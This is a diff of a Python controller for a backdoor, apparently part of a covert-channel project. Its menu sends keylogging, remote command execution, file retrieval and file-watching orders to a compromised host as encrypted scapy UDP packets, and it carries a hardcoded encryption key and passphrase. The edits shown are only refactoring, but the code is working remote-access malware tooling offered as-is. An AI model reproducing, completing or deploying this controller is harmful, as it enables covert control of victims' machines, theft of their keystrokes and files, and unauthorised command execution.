@@ -1,8 +1,10 @@
+import warnings
+
+warnings.filterwarnings(action="ignore")
 from encryption import encryption
 from scapy.all import *
 from scapy.layers.inet import IP, UDP
 import logging
-
 
 key = b'eoxuXDM-FYNQ_o0PxQaxCcXW-u6h26ytH4vx2zYCiM0='
 code = "secret"
@@ -10,10 +12,11 @@ SIZE = 1024
 
 
 def main():
-    ip = input("Enter backdoor IP: ")
-    # ip = "192.168.1.26"
-    controller = c2(ip)
+    logging.basicConfig(level=logging.INFO)
     try:
+        ip = input("Enter backdoor IP: ")
+        # ip = "192.168.1.26"
+        controller = c2(ip)
         while True:
             opt = menu()
             if menu_parse(opt, controller) == 1:
@@ -23,8 +26,8 @@ def main():
 
 
 def menu():
-    logging.info("1. start key log\n2. stop key log\n3. execute command\n4. retrieve file\n5. start watching file\n6. "
-                 "stop watching file\n7. start watching directory\n8. stop watching directory\n9. exit")
+    print("1. start key log\n2. stop key log\n3. execute command\n4. retrieve file\n5. start watching file\n6. "
+          "stop watching file\n7. start watching directory\n8. stop watching directory\n9. exit")
     option = input()
     return option
 
@@ -81,11 +84,11 @@ class c2:
                 logging.debug("Error")
 
     def opt_execute(self, opt):
-        logging.info("Executing command:"+opt)
+        logging.info("Executing command:" + opt)
         self.command_sender(3, opt)
 
     def opt_file_get(self, opt):
-        logging.info("Getting file:"+opt)
+        logging.info("Getting file:" + opt)
         self.command_sender(4, opt)
 
     def opt_file_watch(self, opt, file):
@@ -120,7 +123,8 @@ class c2:
         port = 10001
         s_port = random.randrange(35000, 62000)
         encrypted_data = self.encrypter.encrypt(code + ":" + data)
-        dgram = IP(dst=self.kit_ip, id=rand_id) / UDP(sport=s_port, dport=port, len=int(len(encrypted_data))) / encrypted_data
+        dgram = IP(dst=self.kit_ip, id=rand_id) / UDP(sport=s_port, dport=port,
+                                                      len=int(len(encrypted_data))) / encrypted_data
         send(dgram, verbose=0)
 
 
